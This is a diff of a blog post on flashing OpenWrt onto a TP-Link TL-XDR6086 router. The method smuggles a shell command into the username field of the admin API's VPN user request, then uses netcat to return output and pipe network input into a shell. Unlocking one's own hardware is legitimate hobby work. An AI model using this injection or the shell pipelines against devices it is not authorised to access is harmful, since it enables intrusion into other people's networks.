@@ -1,168 +1,157 @@
 ---
-title: 'Install Openwrt in TP-Link TL-XDR6086'
-description: 'use shell injection to flash Openwrt into TL-XDR6086'
-pubDate: 'Aug 29 2024'
+title: "Flashing OpenWrt onto the TP-Link TL-XDR6086 via Shell Injection"
+description: "Exploiting a command injection vulnerability in the TL-XDR6086 admin API to gain root access and flash OpenWrt firmware."
+pubDate: "Aug 29 2024"
 tags:
   - Router
   - OpenWrt
-updatedDate: 'Mar 03 2026'
-heroImageId: '3c7ff10d-721c-4a50-bdbd-e2a2afc91200'
+  - Security
+updatedDate: "Mar 03 2026"
+heroImageId: "3c7ff10d-721c-4a50-bdbd-e2a2afc91200"
 heroImageOwned: true
 ---
 
-Since I need a small wifi router with acceptable performance and openwrt support, I started searching routers.
+I wanted a compact Wi-Fi router that could handle real workloads — specifically, one capable of running OpenWrt with a global transparent proxy. After some research, I settled on these requirements:
 
-With needs:
+1. **OpenWrt support**: OpenWrt's package ecosystem is unmatched for things like transparent proxying and custom routing rules.
+2. **Internal antennas**: Cleaner setup, less desk clutter.
+3. **2.5 Gbps WAN port**: Future-proofing for high-speed uplinks.
+4. **A capable CPU**: Necessary to run OpenWrt without choking on 2.5 Gbps throughput.
 
-1. OpenWrt Installable: I love openwrt, because of providing many unique functions like global transparent proxy.
-2. Internal Antenna: Takes up less space and is neater.
-3. 2.5 Gbps Cable Interface
-4. Strong CPU: for OpenWrt and 2.5 Gbps bandwidth
+The TP-Link TL-XDR6086 checked every box, and it appeared in the [OpenWrt device table](https://openwrt.org/toh/tp-link/xdr-6086) — so I bought one.
 
-I found TP-Link TL-XDR6086 in OpenWrt device list and bought one.
+## Before You Start
 
-You can find the [tutorial](https://openwrt.org/toh/tp-link/xdr-6086) easily in OpenWrt website.
+Replacing your router's firmware is not a supported operation. Think of it like rooting an Android phone: you're deliberately circumventing manufacturer restrictions, usually by exploiting a vulnerability. **This will void your warranty**, and there is a real risk of bricking the device.
 
-## Common knowledge you must know
+> **If your router dies following these steps, that's on you. It works on my machine.**
 
-It should be considered unusual that you can replace your router's operating system. Similar to gaining root access on an Android phone, this involves obtaining permissions that manufacturers intentionally restrict, typically through exploiting system vulnerabilities. You'd better think this operation will void the warranty.
+A few ground rules:
 
-If you do what I did but in your case your router can never boot again, not my fault. It works on my machine.
+- **Use the [OpenWrt Wiki](https://openwrt.org/toh/tp-link/xdr-6086)** as your primary reference — not Baidu, not AI, not random forums, not this post alone.
+- Pre-built packages are available at the [OpenWrt package mirror](https://downloads.openwrt.org/releases/21.02-SNAPSHOT/packages/aarch64_cortex-a53/packages/). No need to compile from source for most things.
+- **This guide assumes you're comfortable with a Linux (or macOS/FreeBSD) terminal.** If you're on Windows, sort that out first.
 
-You **should** search the device information in [OpenWrt Wiki](https://openwrt.org/toh/tp-link/xdr-6086), **not** Baidu, yahoo or other random somewhere.
+## The Vulnerability: Command Injection in the VPN User API
 
-You might need to download [built packages](https://downloads.openwrt.org/releases/21.02-SNAPSHOT/packages/aarch64_cortex-a53/packages/) from OpenWrt source, to avoid compile them manually.
+The exploit targets the router's admin HTTP API. When creating a VPN user via `POST /stok=${STOK}/ds`, the `username` field is passed unsanitized to a shell command on the router. This is a classic **command injection** vulnerability.
 
-I assume you know how to use Linux (or MacOS, freeBSD). If you only use Windows, get outta here.
+> To get your `STOK` token: log into the admin panel, open DevTools (F12), and inspect the network requests. You'll find it in the request URLs.
 
-## How the vulnerability works
-
-When you call `http://192.168.1.1/stok=${STOK}/ds` to create a VPN user, there is a slot you can inject the shell command.
-
-> After entering the admin page, use F12 to find the fetch requests, then you can get `${STOk}`.
+### Injection payload
 
 ```json
 {
-    "vpn":{
-        "table":"user",
-        "para":{
-            "username":"; INJECT YOUR SHELL COMMAND HERE&",
-            "password":"password1",
-            "type":"l2tp",
-            "netmode":"client2lan",
-            "localip":"192.168.2.1",
-            "dns":"1.1.1.1",
-            "block":"0",
-            "ippool":"new",
-            "maxsessions":"1"
-        },
-        "name":"user_1"
+  "vpn": {
+    "table": "user",
+    "para": {
+      "username": "; YOUR_COMMAND_HERE &",
+      "password": "password1",
+      "type": "l2tp",
+      "netmode": "client2lan",
+      "localip": "192.168.2.1",
+      "dns": "1.1.1.1",
+      "block": "0",
+      "ippool": "new",
+      "maxsessions": "1"
     },
-    "method":"add"
+    "name": "user_1"
+  },
+  "method": "add"
 }
 ```
 
-> For example, if you want to execute `echo 'fuck'`, `username` should be `;echo 'fuck'&`
+The injected command is stored in the router's database and **executed when you delete the VPN user**. For example, to run `echo 'hello'`, set `username` to `;echo 'hello'&`.
 
-Now, the shell command is stored in database. The trigger is when you delete this VPN user.
+## Flashing OpenWrt
 
-## Replace with OpenWrt
+### Step 1: Prepare a USB Drive
 
-First, prepare a USB media. 
+Format a USB drive as FAT32. Download `netcat` from the [OpenWrt package mirror](https://downloads.openwrt.org/releases/21.02-SNAPSHOT/packages/aarch64_cortex-a53/packages/) and save it to the drive as `netcat.ipk`.
 
-> By the way, based on what I've observed in Chinese forums, where many experienced users are skilled at bypassing CCP monitoring through VPNs, the most popular solution in Chinese OpenWrt community is to set up a TFTP server on a PC and configure the router to download everything from it.
->
-> This is too troubling. For windows users, they even suggest them to install WSL then operate like a linux user.
->
-> I think this is because many of them shares the solution without fully understanding why that works.
+> **Why not TFTP?** The Chinese OpenWrt community commonly recommends setting up a TFTP server on your PC, but that's unnecessarily complex. A USB drive sidesteps the whole setup. The TFTP approach is popular because people tend to copy solutions without fully understanding them.
 
-Download [`natcat`](https://downloads.openwrt.org/releases/21.02-SNAPSHOT/packages/aarch64_cortex-a53/packages/) into USB media. You'd better format it with FAT32, and rename the package into `netcat.ipk`.
+### Step 2: Mount the USB Drive and Establish a Reverse Shell
 
-### Mount USB media and prepare reflect shell
-
-Run the following commands through the vulnerability I mentioned before.
+Inject the following command to create a mount point:
 
 ```sh
 mkdir /tmp/usb
 ```
 
-Listen with netcat in your PC to receive the output from the injected shell.
+On your PC, start listening with netcat:
 
 ```sh
 nc -l -p 4444
 ```
 
-> netcat is a network testing tool, also is widely used for reflect shell.
->
-> Listen on your PC with netcat, and pipe the output of injected shell into `nc` in router, then you can get the output in your PC.
->
-> If netcat is installed in the router, is is possible to listen with netcat on router from PC. By piping the message from pc, you can run the command from your PC.
+> **What's a reverse shell?** Instead of connecting _to_ the router, the router connects _out to you_. You listen on your PC; the router pipes its shell output through `nc` to your machine. This bypasses firewall rules that block inbound connections.
 
-For example, you can use this command to check if the creation is successful. Replace `192.168.1.100` with your PC's address.
+Verify the injection worked — replace `192.168.1.100` with your PC's IP:
 
 ```sh
 ls -la /tmp | nc 192.168.1.100 4444
 ```
 
-If succeed, mount the USB media. 
-
-Attention that if you have plugged out the media, the number will increase, like `sda2` `sda3`, when you plug in. The number will recover to 1 after you reboot the device.
+If you see directory output on your PC, the injection is working. Now mount the USB drive:
 
 ```sh
 mount -t vfat /dev/sda1 /tmp/usb
 ```
 
-> use `ls /dev | nc 192.168.1.100 4444` to find the name of USB media.
+> **Note on device naming:** Every time you unplug and replug the USB drive, the device node increments (`sda1` → `sda2` → `sda3`). It resets to `sda1` after a router reboot. Use `ls /dev | nc 192.168.1.100 4444` to confirm the current device name before mounting.
 
-Check whether mounting is successful
+Verify the mount:
 
 ```sh
 ls -la /tmp/usb | nc 192.168.1.100 4444
 ```
 
-Then, install natcat
+Install netcat from the USB drive:
 
 ```sh
 opkg install /tmp/usb/netcat.ipk
 ```
 
-Now, it is more convenient to run the shell command by netcat.
+With netcat installed natively, you now have a proper interactive reverse shell:
 
 ```sh
 netcat -lp 4444 | sh
 ```
 
-### Backup
+### Step 3: Backup the Original Firmware
 
-backup to usb media:
+Before touching anything, back up the current flash partition. You'll be grateful for this if anything goes wrong.
 
 ```sh
 dd if=/dev/mtdblock9 of=/tmp/usb/backup.img bs=131072
 ```
 
-### Install U-Boot
+### Step 4: Flash U-Boot
 
-**CAUTION: DANGEROUS OPERATION! Ensure acknowledging what and why you are doing!**
+> ⚠️ **This is the most dangerous step. A failed write here can permanently brick the router. Understand what you're doing before proceeding.**
 
-According to [this GitHub issue](https://github.com/hanwckf/immortalwrt-mt798x/issues/207), you can compile the u-boot from [the source code for bl-mt98x](https://github.com/hanwckf/bl-mt798x). *Of course you can also download form others*.
+You'll need the U-Boot binaries for this device. You can compile them from [hanwckf's bl-mt798x source](https://github.com/hanwckf/bl-mt798x) (referenced in [this issue](https://github.com/hanwckf/immortalwrt-mt798x/issues/207)), or download pre-built binaries from a trusted source.
 
-Execute these two commands *in order*. You must ensure the first one is successful then you can run the second one. Maybe the filename is different, the key is bl2 first then fip.
+Flash in strict order — **bl2 first, then fip**:
 
 ```sh
 dd bs=131072 conv=sync of=/dev/mtdblock9 if=/tmp/usb/xdr608x-bl2.bin
 dd bs=131072 conv=sync of=/dev/mtdblock9 seek=28 if=/tmp/usb/xdr608x-fip.bin
 ```
 
-> use `2>&1 |` to receive the error
+> Append `2>&1 | nc 192.168.1.100 4444` to capture any errors from the second command.
 
-Set ip address in PC as `192.168.1.100/24`, the default gateway as `198.168.1.1`.
+**Do not run the second command if the first fails.**
 
-Cut off the power of router, then power up. If going well, the LED should blinks with red. Open <http://192.168.1.1> in browser and you can see the u-boot web ui.
+### Step 5: Boot into U-Boot and Flash OpenWrt
 
-![u-boot web ui](https://imagedelivery.net/6gszw1iux5BH0bnwjXECTQ/5d6eb200-ac42-4b02-c09b-f689ec194d00/public)
+Set your PC's IP to `192.168.1.100/24` with a default gateway of `192.168.1.1`.
 
-### Install OpenWrt
+Power-cycle the router. If U-Boot flashed correctly, the LED will blink red. Navigate to `http://192.168.1.1` — you should see the U-Boot web UI.
 
-As of August 29, 2024, XDR-6086 is not fully supported by OpenWrt. It is quite difficult to find OpenWrt firmware that is compatible with XDR-6086.
+![U-Boot web UI](https://imagedelivery.net/6gszw1iux5BH0bnwjXECTQ/5d6eb200-ac42-4b02-c09b-f689ec194d00/public)
 
-I find compatible one in a Chinese forum called En Shan Forum (恩山论坛).
+Upload your OpenWrt firmware image through the UI.
+
+> **Firmware compatibility note:** As of the original writing (August 2024), the XDR-6086 lacks full upstream OpenWrt support. Finding a compatible image took some digging. I eventually found a working build on [恩山论坛 (En Shan Forum)](https://www.right.com.cn/forum/), a Chinese router enthusiast community. Search there if the official releases don't support this device yet.
